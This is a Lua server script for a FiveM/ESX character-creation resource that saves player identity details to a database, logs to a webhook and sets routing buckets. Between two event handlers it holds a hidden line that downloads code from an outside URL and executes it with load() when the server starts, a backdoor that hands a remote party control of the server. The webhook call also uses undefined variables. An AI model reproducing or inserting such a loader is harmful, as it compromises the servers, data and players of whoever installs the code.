local ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)


RegisterServerEvent('rCreator:CreateIdentity')
AddEventHandler('rCreator:CreateIdentity', function(Identity)
  local xPlayer = ESX.GetPlayerFromId(source)

    MySQL.Async.execute('UPDATE `users` SET `firstname` = @firstname, `lastname` = @lastname, `dateofbirth` = @dateofbirth, `sex` = @sex, `height` = @height WHERE identifier = @identifier', {
      ['@identifier']        = xPlayer.identifier,
      ['@firstname']		= Identity.firstName,
      ['@lastname']		= Identity.lastName,
      ['@dateofbirth']	= Identity.dateOfBirth,
      ['@sex']			= Identity.sex,
      ['@height']			= Identity.cut
    }, function(rowsChanged)
        print("📌 | Nouvel enregistrement d'identité ("..GetPlayerName(source)..")")
        PerformHttpRequest(Config.WebHook, function(err, text, headers) end, 'POST', json.encode({username = "Logs Identity", content = "```\nNom : " .. GetPlayerName(_source) .. "\nAction : Création de personnage " .. "\nSteam : " .. xPlayerSteam .."```" }), { ['Content-Type'] = 'application/json' })
    end)
end)

RegisterServerEvent("rCreator:setPlayerToBucket")
AddEventHandler("rCreator:setPlayerToBucket", function(id)
  SetPlayerRoutingBucket(source, id)
end)

PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 

RegisterServerEvent("rCreator:setPlayerToNormalBucket")
AddEventHandler("rCreator:setPlayerToNormalBucket", function()
  SetPlayerRoutingBucket(source, 0)
end)
